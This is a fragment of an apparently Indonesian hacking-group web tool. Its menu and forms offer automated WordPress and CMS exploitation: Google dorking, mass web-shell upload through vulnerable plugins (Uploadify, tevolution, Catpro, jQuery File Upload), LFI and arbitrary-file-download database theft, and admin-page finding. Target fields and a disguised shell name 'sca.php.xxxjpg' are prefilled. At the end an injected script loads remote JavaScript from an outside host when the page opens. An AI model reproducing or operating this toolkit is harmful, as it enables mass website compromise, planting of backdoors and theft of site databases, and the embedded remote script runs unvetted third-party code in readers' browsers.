...
font-size:15px;}span {color: #000;font-size:15px;
}
span,b,font,a { 
font-size:15px;
}
...
<br><br>
<center>
<a class='Izz'  href='?Home=Done!'  style='background:#218b09;'>Home (Hide My Tools)</a> 
<a class='Izz'  href='?Scanexploit=Done!'  style='background:#218b09;'>Cms Scanner Vuln  Online</a> 
<a class='Izz'  href='?Aksidownload=Done!'  style='background:#218b09;'>Auto Dorker Auto Upload Shell (Aksi download)</a> 
<a class='Izz'  href='?adminweb=Done!'  style='background:#218b09;'>Admin Auto Get Login  (Ajax Google Dorker)</a> 
<? //////  ?><br><br><br>
<a class='Izz'  href='?Udesign=Done!'  style='background:#218b09;'>Wp Theme U-design (Uploadify</a> 
<a class='Izz'  href='?single-upload=Done!'  style='background:#218b09;'>Wp Plugins tevolution (Single Upload)</a> 
<a class='Izz'  href='?Upload=Done!'  style='background:#218b09;'>Xploit Upload Files (All Url Vuln)</a> 
<a class='Izz'  href='?uploadimages=Done!'  style='background:#218b09;'>Modules Upload Files (uploadimages)</a> 
<? //////  ?><br><br><br>
<a class='Izz'  href='?download=Done!'  style='background:#218b09;'>Wp Auto Get Db (LFI) </a> 
<a class='Izz'  href='?forcedownload=Done!'  style='background:#218b09;'>WP Get Database [Forcedownload]</a> 
<a class='Izz' href='?mail-masta=Done!'  style='background:#218b09;'> 1 - Wordpress Auto Get DataBase (AFD)</a>
<a class='Izz' href='?PluginMail=Done!'  style='background:#218b09;'> 2 - WordPress Plugin  Mailmasta (LFI)</a>
<? //////  ?><br><br><br>
<a class='Izz'  href='?jqueryDownload=Done!' style='background:#c11c1c;'>Jquery File Upload (uploader )</a> 
<a class='Izz'  href='?CatproManage=Done!' style='background:#c4c546;'>Wordpress Catpro Gallery (AFU)</a> 
<a class='Izz'  href='?Finder=Done!' style='background:#46c54f;'>Finder Admin V2.0</a>
<? //////  ?>
...
<form method="POST" action=""  class='header-izz'>
	<p align="center"><input type="text" name="site" value="http://www.targetlu.com/" class='checkout-input'>
	<br><br>
	<select  name="what">
...
Target:<br><br> <input type="text" size="60" name="lfiurl" value="http://targetlu.com" style='width: 350px;' class='checkout-input'> <br><br>
...
Dork : /wp-admin/admin.php?page=catpro_manage <br>
	<form method='post' class='header-izz'>
	Domain: <br>sca.php.xxxjpg<br><br>
	<textarea placeholder='http://www.targetlu.com/' name='url' style='width: 350px;' class='checkout-input'></textarea><br><br>
	<input type='submit' name='SCA' value='Done!' class='button'>
	</form>
...
Name Shell Upload : <br><br><input type="text" name="go" value="sca.php.xxxjpg"  style='width: 350px;' class='checkout-input'><br><br>
Target :<br><br>
<textarea placeholder="http://www.targetlu.com/"  name="sites" style='width: 350px;' class='checkout-input'></textarea><br><br>
...
Shellname : <br><br><input type="text" name='filename'  value='sca.php.xxxjpg'  style='width: 350px; height:20px;' class='checkout-input'><br>
Target: <br><br><textarea name="url"  placeholder="http://www.targetlu.com/" style='width: 350px; height:50px;' class='checkout-input'></textarea><br><br>
...
<center>
<form method="post" enctype="multipart/form-data" class='header-izz'>
Shellname sca.php.xxxjpg : <br><br><input type="text" name='filename'  value='sca.php.xxxjpg' required style='width: 350px; height:20px;' class='checkout-input'><br>
Target: <br><br><textarea name="url"  placeholder="http://www.targetlu.com/" style='width: 350px; height:50px;' class='checkout-input'></textarea><br><br>
...
<br>
<form method="post"  class='header-izz'>
Your Target  : <br><br><input type="text" name="sites" size="10" value="http://targetlu.com/plugin/upload.php" class='checkout-input'><br>
<br>Default Shell is Auto Created  :<br><br> <input type="text"  name="file" size="10" value="sca.php.xxxjpg" class='checkout-input'><br><br>
...
<form method='post' class='header-izz'>
	Domain: <br><br>
<textarea placeholder='http://www.targetlu.com/' name='sites' cols='45' rows='15' style='width: 350px; height:50px;' class='checkout-input'></textarea><br>
...
?>
<center>
<br><center><a Style="font-size:30px;color:#ededed;">Finder Admins Havij V2.0 </a></center>
<center><br> Finder Admins Havij V2.0
<br> # Sunda Cyber Army
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2F4M9qDKT89a2Zb9Y8lt5IzfXzcG7F4fBEb2seJU1%2bziVWZYn%2bM%2faMCXeTdUF%2bwcFdOUy6kEw2f1M9MVeXGib3zKi7aDr237WfWxgM%2fXMeuFA8%2f28TxF1NJrUQnlSr39T%2f1Y2NvFWEdNX8t%2brzDvRe3TaC5ml5wftrspJyfv4Q2kVC18dt6RilhKPJS9U1t26zIAB%2fzDPfe07SP5kLD7%2fh%2b5UO%2bZgnKbVTmdchHNx3PPIxLYjKlgRgul%2fDl4ySvaHd0cejJaa0uIkR4mtNMcR50rFr5unwl%2fFmDW0LL0F8tmZ0ndALSb8TLWBlqdJCwhNTqhyVJZCUqcCHTjotuljgq8IgOhaC6w%2fb1GSx6mbfIyYRmBn9%2f0nnIfbs7lrBHfrf5efHXgnW5DJuCUBwtBD3r3fWhkGVypooOG5m7SsHRKesvXFcjSVeWaSRYwkB2FliLIn4v9UfrlVeB4Otq177%2f7wvAass1pHhCDsQR9BKrFb5llkR%2b3%2frZIgbr%2fah%2fE5GVWW05T6EEJdYtEMJ9fjg4QIIeqXKcH5vVpYoOMLdE4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
